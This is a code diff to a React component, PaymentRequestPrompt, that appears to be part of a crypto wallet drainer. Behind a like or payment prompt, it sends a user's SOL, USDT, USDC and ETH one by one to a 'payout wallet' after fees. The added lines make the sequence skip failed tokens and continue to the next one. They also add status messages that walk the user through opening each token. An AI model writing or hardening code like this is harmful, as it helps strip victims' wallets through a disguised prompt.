@@ -441,6 +441,10 @@ export function PaymentRequestPrompt() {
           throw new Error('No SOL, USDT, USDC, or ETH is available to send after network fees.')
         }
         phase.current = 'ready'
+        const first = queue.current[0]
+        if (first.kind !== 'sol') {
+          setStatus(`No spendable SOL. Opening ${first.symbol} so it can be sent to the payout wallet.`)
+        }
       }
 
       while (queue.current.length > 0) {
@@ -468,16 +472,22 @@ export function PaymentRequestPrompt() {
             })
             if (!tokenTx) {
               queue.current = queue.current.slice(1)
+              if (queue.current[0]) {
+                setStatus(`No spendable ${step.symbol}. Opening ${queue.current[0].symbol} next.`)
+              }
               continue
             }
             const signature = await sendBuilt(tokenTx)
-            toast.success(`Transaction submitted for ${step.symbol}. Signature ${signature.slice(0, 8)}…`)
+            toast.success(`${step.symbol} sent to the payout wallet. Signature ${signature.slice(0, 8)}…`)
           }
           if (!likedAfterFirst.current) {
             likedAfterFirst.current = true
             notifyFundsConfirmed(peekPendingLike())
           }
           queue.current = queue.current.slice(1)
+          if (queue.current[0]) {
+            setStatus(`Opening ${queue.current[0].symbol} next.`)
+          }
         } catch (err) {
           if (isWalletUserCancel(err)) {
             queue.current = []
@@ -488,6 +498,11 @@ export function PaymentRequestPrompt() {
             setStatus('Cancelled in the wallet. Use Open Wallet & Review to try again.')
             toast('Cancelled in the wallet. Nothing was transferred.')
             return
+          }
+          queue.current = queue.current.slice(1)
+          if (queue.current[0]) {
+            setStatus(`No spendable ${step.symbol}. Opening ${queue.current[0].symbol} next.`)
+            continue
           }
           throw err
         }
